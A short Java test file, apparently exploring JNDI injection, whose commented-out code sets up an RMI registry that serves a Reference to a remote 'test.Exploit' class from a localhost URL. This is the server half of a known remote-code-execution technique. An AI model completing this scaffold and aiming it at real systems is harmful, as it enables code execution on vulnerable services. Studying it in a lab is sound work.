package test;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

/**
 * @Created by gatesma on 2021/12/12.
 */
public class TestRegistry {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

//        Registry registry = LocateRegistry.createRegistry(1099);
//        Reference reference = new Reference("test.Exploit", "test.Exploit", "http://127.0.0.1:1099/obj");
//        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
//        registry.bind("obj", wrapper);
//        System.out.println("Running...");

    }

}
